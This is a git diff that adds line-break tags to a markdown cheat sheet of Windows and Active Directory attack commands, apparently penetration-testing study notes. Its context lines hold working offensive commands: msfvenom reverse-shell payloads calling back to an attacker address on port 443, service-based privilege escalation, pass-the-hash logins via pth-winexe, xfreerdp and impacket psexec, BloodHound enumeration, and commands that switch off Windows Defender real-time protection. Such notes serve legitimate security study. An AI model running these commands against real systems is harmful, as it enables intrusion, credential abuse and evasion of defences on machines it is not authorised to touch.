@@ -2,8 +2,9 @@
 
 Anything about **Windows / Active Directory** will be posted here ..
 
-
+<br/>
 ## < Generate shells >
+<br/>
 
 **[+] Create reverse shell using msfvenom**
 
@@ -13,8 +14,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f e
 // TCP
 msfvenom -p  windows/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe
 ```
-
+<br/>
 ## < Transfer files >
+<br/>
 
 **[+] Upload file using Powershell**
 
@@ -40,7 +42,9 @@ and put your files there, you will find them in Kali too
 Note: You can access the share \\tsclient directly too
 ```
 
+<br/>
 ## < Privilege escalation >
+<br/>
 
 **[+] Privilege escalation using juicy potato (Sometimes you need to attach CLSID)**
 
@@ -95,7 +99,9 @@ C:\Users\victim\Desktop>sc config SNMPTRAP obj= ".\LocalSystem" password= ""
 C:\Users\victim\Desktop>sc start SNMPTRAP
 ```
 
+<br/>
 ## < Kerberos / tickets >
+<br/>
 
 **[+] Request Ticket (powershell)**
 
@@ -127,7 +133,9 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 } 
 ```
 
+<br/>
 ## < Pass the hash / PTH >
+<br/>
 
 **[+] Pass the hash using pth-winexe (Available in Kali Linux)**
 
@@ -147,7 +155,9 @@ xfreerdp /u:username /pth:NTLM /d:domain /v:IP
 python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM sqldevadmin@192.168.50.49
 ```
 
+<br/>
 ## < Enumeration >
+<br/>
 
 **[+] enum SMB shares using smbclient (Smbclient available in Kali Linux)**
 
@@ -165,7 +175,9 @@ smbclient -L IP
 Invoke-BloodHound -CollectionMethod All
 ```
 
+<br/>
 ## < Bypass security / AV evasion >
+<br/>
 
 **[+] Bypass Powershell Execution Policy**
 
@@ -185,7 +197,9 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Ti
 powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
+<br/>
 ## < Misc commands >
+<br/>
 
 **[+] Enable RDP and allow it in the firewall too**
 
